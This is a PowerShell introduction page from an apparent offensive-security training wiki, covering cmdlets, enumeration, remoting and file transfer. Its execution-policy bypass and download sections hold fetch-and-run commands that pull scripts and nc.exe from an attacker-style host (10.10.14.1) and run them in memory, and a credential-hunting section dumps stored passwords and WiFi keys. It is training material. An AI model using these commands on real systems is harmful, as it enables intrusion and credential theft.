% Filename: 01-fundamentals/windows-basics/powershell-intro.md
% Display name: PowerShell Introduction
% Last update: 2026-02-19
% ATT&CK Tactics: N/A
% ATT&CK Techniques: N/A
% Authors: @TristanInSec

# PowerShell Introduction

## Overview

PowerShell is a task automation framework built on .NET, combining a command-line shell with a scripting language. Unlike CMD, PowerShell operates on objects rather than text — every command returns structured data that can be filtered, sorted, and manipulated without parsing strings. For security professionals, PowerShell is both a powerful offensive tool (in-memory execution, AD enumeration, remote management) and a defensive asset (logging, detection, hardening). It ships with all modern Windows versions and is available cross-platform (PowerShell 7+ runs on Linux and macOS).

## Key Concepts

### Cmdlet Structure

PowerShell commands (cmdlets) follow a consistent `Verb-Noun` pattern:

```powershell
Verb-Noun -Parameter Value

Get-Process                         # List all processes
Get-Service -Name "WinRM"           # Query specific service
Stop-Process -Id 1234               # Kill process by PID
Set-ExecutionPolicy Bypass          # Change execution policy (not a security boundary — see ExecutionPolicy section below)
```

**Common verbs:**

```text
Verb      Purpose                    Example
--------  -------------------------  ----------------------------
Get       Retrieve data              Get-Process, Get-Service
Set       Modify data                Set-Item, Set-Content
New       Create something           New-Item, New-Object
Remove    Delete something           Remove-Item, Remove-Service
Start     Begin an action            Start-Process, Start-Service
Stop      End an action              Stop-Process, Stop-Service
Invoke    Execute something          Invoke-Command, Invoke-WebRequest
Test      Validate something         Test-Path, Test-Connection
Out       Send output                Out-File, Out-GridView
Export    Save to structured format  Export-Csv, Export-Clixml
```

### The Help System

```powershell
# Update help files (requires admin, internet)
Update-Help

# Get help for a cmdlet
Get-Help Get-Process

# Detailed help with examples
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Find cmdlets by keyword
Get-Command *process*
Get-Command -Verb Get -Noun *service*

# List all available cmdlets
Get-Command -CommandType Cmdlet

# Get help for a parameter
Get-Help Get-Process -Parameter Name
```

### Pipeline and Object Model

The pipeline passes objects (not text) between commands. Each object has properties and methods you can access directly.

```powershell
# Pipe objects from one cmdlet to another
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10

# Filter objects
Get-Process | Where-Object { $_.CPU -gt 100 }

# Select specific properties
Get-Service | Select-Object Name, Status, StartType

# Format output as table or list
Get-Process | Format-Table Name, Id, CPU -AutoSize
Get-Service | Format-List *

# Count results
(Get-Process).Count

# Export to CSV
Get-Process | Export-Csv -Path C:\Temp\processes.csv -NoTypeInformation

# View object properties and methods
Get-Process | Get-Member
```

**Pipeline operators:**

```text
Operator   Purpose                    Example
---------  -------------------------  ----------------------------------
|          Pipe output to next cmd    Get-Process | Stop-Process
>          Redirect to file           Get-Process > procs.txt
>>         Append to file             Get-Date >> log.txt
2>         Redirect errors            Get-Item bad 2> errors.txt
```

### Variables and Data Types

```powershell
# Assign variable
$target = "10.10.10.5"
$port = 445
$users = @("admin", "user1", "user2")

# String interpolation (double quotes expand variables)
Write-Output "Target: $target on port $port"

# Single quotes are literal (no expansion)
Write-Output 'Target: $target'    # prints: Target: $target

# Arrays
$hosts = @("10.10.10.1", "10.10.10.2", "10.10.10.3")
$hosts[0]                          # first element
$hosts += "10.10.10.4"            # append

# Hash tables
$creds = @{
    Username = "admin"
    Password = "P@ssw0rd"
    Domain   = "CORP"
}
$creds.Username                    # access by key

# Automatic variables
$_                                 # current pipeline object
$PSVersionTable                    # PowerShell version info
$env:USERNAME                      # environment variable
$env:COMPUTERNAME
$PROFILE                           # path to profile script
```

### Comparison and Logical Operators

```text
Operator   Purpose             Example
---------  ------------------  -----------------------------------
-eq        Equal               $x -eq 5
-ne        Not equal           $x -ne 0
-gt        Greater than        $x -gt 10
-lt        Less than           $x -lt 100
-ge        Greater or equal    $x -ge 1
-le        Less or equal       $x -le 50
-like      Wildcard match      $name -like "*admin*"
-match     Regex match         $str -match "pass\w+"
-contains  Array contains      $arr -contains "value"
-in        Value in array      "admin" -in $arr
-and       Logical AND         ($x -gt 1) -and ($x -lt 10)
-or        Logical OR          ($x -eq 1) -or ($x -eq 2)
-not       Logical NOT         -not (Test-Path C:\Temp)
```

### System Enumeration

```powershell
# System info
Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber, CsDomain

# Running processes
Get-Process | Select-Object Id, ProcessName, Path | Sort-Object ProcessName

# Services
Get-Service | Where-Object { $_.Status -eq "Running" }
Get-CimInstance Win32_Service | Select-Object Name, StartName, PathName, State

# Installed software
# WARNING: Win32_Product triggers MSI reconfiguration of all installed packages when queried,
# causing event log noise, performance impact, and potential application disruption.
# Prefer querying the Uninstall registry key instead for enumeration:
#   Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion,Publisher
Get-CimInstance Win32_Product | Select-Object Name, Version, Vendor

# Installed hotfixes
Get-HotFix | Select-Object HotFixID, Description, InstalledOn

# Scheduled tasks
Get-ScheduledTask | Where-Object { $_.State -eq "Ready" } |
    Select-Object TaskName, TaskPath, State

# Drives
Get-PSDrive -PSProvider FileSystem

# Startup programs
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location
```

### User and Group Enumeration

```powershell
# Current user
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Current user SID
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value

# Local users
Get-LocalUser | Select-Object Name, Enabled, LastLogon

# Local groups
Get-LocalGroup

# Members of Administrators
Get-LocalGroupMember -Group "Administrators"

# Check if current user is admin
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Network Enumeration

```powershell
# IP configuration
Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength
Get-NetIPConfiguration

# DNS servers
Get-DnsClientServerAddress

# Active TCP connections
Get-NetTCPConnection | Select-Object LocalPort, RemoteAddress, RemotePort, State, OwningProcess

# Listening ports
Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess

# Resolve port to process
Get-NetTCPConnection -State Listen |
    Select-Object LocalPort, @{N="Process";E={(Get-Process -Id $_.OwningProcess).ProcessName}}

# ARP table
Get-NetNeighbor

# Routing table
Get-NetRoute

# Firewall rules
Get-NetFirewallRule | Where-Object { $_.Enabled -eq "True" } |
    Select-Object DisplayName, Direction, Action

# DNS lookup
Resolve-DnsName example.com
Resolve-DnsName -Name example.com -Type MX

# Test connectivity (like ping)
Test-Connection 10.10.10.5 -Count 2

# Test port (like nc -zv)
Test-NetConnection 10.10.10.5 -Port 445
```

### File Operations

```powershell
# List files (equivalent of dir)
Get-ChildItem C:\Users\

# List recursively with filter
Get-ChildItem -Path C:\Users\ -Recurse -Filter "*.txt" -ErrorAction SilentlyContinue

# Search file contents (like findstr/grep)
Get-ChildItem -Path C:\Users\ -Recurse -Filter "*.config" |
    Select-String -Pattern "password" -CaseSensitive:$false

# Read file
Get-Content C:\Windows\System32\drivers\etc\hosts

# Write to file
"test content" | Set-Content C:\Temp\output.txt

# Append to file
"more content" | Add-Content C:\Temp\output.txt

# Check if path exists
Test-Path C:\Temp\output.txt

# File hashes
Get-FileHash C:\Windows\notepad.exe -Algorithm MD5
Get-FileHash C:\Windows\notepad.exe -Algorithm SHA256

# ACLs on file/directory
Get-Acl C:\Users\ | Format-List
```

### Execution Policy

Execution policy controls which PowerShell scripts can run. It is a safety feature, not a security boundary — it can be bypassed in many ways.

```powershell
# Check current policy
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Policy levels:
#   Restricted    — no scripts (default on Windows clients; NOT the default on Windows Server)
#   AllSigned     — only signed scripts
#   RemoteSigned  — local scripts OK, downloaded must be signed (default on Windows Server)
#   Unrestricted  — all scripts (prompt for downloaded)
#   Bypass        — nothing blocked, no warnings

# Set policy (requires admin for LocalMachine scope)
Set-ExecutionPolicy Bypass -Scope CurrentUser
```

**Common bypasses (from CMD or restricted environments):**

```cmd
:: Execute script via bypass flag
powershell -ExecutionPolicy Bypass -File script.ps1

:: Execute command directly
powershell -c "Get-Process"

:: Encode command in Base64 (avoids special character issues)
powershell -EncodedCommand <base64-string>

:: Read and execute via pipeline
type script.ps1 | powershell -

:: Download and execute in memory (no file on disk)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/script.ps1')"
```

### Remote Execution

PowerShell Remoting uses WinRM (Windows Remote Management) on ports 5985 (HTTP) and 5986 (HTTPS).

```powershell
# Check if WinRM is running
Test-WSMan 10.10.10.5

# Interactive remote session
Enter-PSSession -ComputerName 10.10.10.5 -Credential DOMAIN\user

# Execute command on remote host
Invoke-Command -ComputerName 10.10.10.5 -Credential DOMAIN\user -ScriptBlock {
    Get-Process; Get-Service
}

# Execute on multiple hosts
Invoke-Command -ComputerName Server1,Server2,Server3 -ScriptBlock {
    hostname; whoami
}

# Copy file to remote host via PSSession
$session = New-PSSession -ComputerName 10.10.10.5 -Credential DOMAIN\user
Copy-Item -Path C:\local\file.exe -Destination C:\Temp\ -ToSession $session
```

### File Downloads

```powershell
# WebClient (simple download)
(New-Object Net.WebClient).DownloadFile("http://10.10.14.1/nc.exe", "C:\Temp\nc.exe")

# Download string (execute in memory)
IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.1/script.ps1")

# Invoke-WebRequest (more features, slower)
Invoke-WebRequest -Uri "http://10.10.14.1/nc.exe" -OutFile "C:\Temp\nc.exe"

# With proxy/credentials
Invoke-WebRequest -Uri "http://10.10.14.1/nc.exe" -OutFile "C:\Temp\nc.exe" -Proxy "http://proxy:8080"
```

## Practical Examples

### Quick Enumeration One-Liner

```powershell
# Dump key info to file
$out = "C:\Temp\enum.txt"
"=== SYSTEM ===" | Out-File $out
Get-ComputerInfo | Select-Object OsName, CsDomain | Out-File $out -Append
"=== USERS ===" | Out-File $out -Append
Get-LocalUser | Out-File $out -Append
"=== ADMINS ===" | Out-File $out -Append
Get-LocalGroupMember Administrators | Out-File $out -Append
"=== NETWORK ===" | Out-File $out -Append
Get-NetIPAddress | Out-File $out -Append
"=== LISTENING ===" | Out-File $out -Append
Get-NetTCPConnection -State Listen | Out-File $out -Append
```

### Credential Hunting

```powershell
# Search for passwords in files
Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.xml,*.ini,*.config -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|passwd|pwd|credential" -CaseSensitive:$false

# Check autologon registry
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" |
    Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon

# Saved credentials
cmdkey /list

# WiFi passwords
(netsh wlan show profiles) | Select-String "All User" |
    ForEach-Object { netsh wlan show profile name=($_ -split ":")[1].Trim() key=clear }
```

## References

### Microsoft Documentation

- [PowerShell Overview](https://learn.microsoft.com/en-us/powershell/scripting/overview)
- [Getting Started with PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/01-getting-started)
- [About Pipelines](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pipelines)
- [About Operators](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators)
- [About Execution Policies](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
- [Running Remote Commands](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands)
- [Microsoft.PowerShell.Management Module](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/)
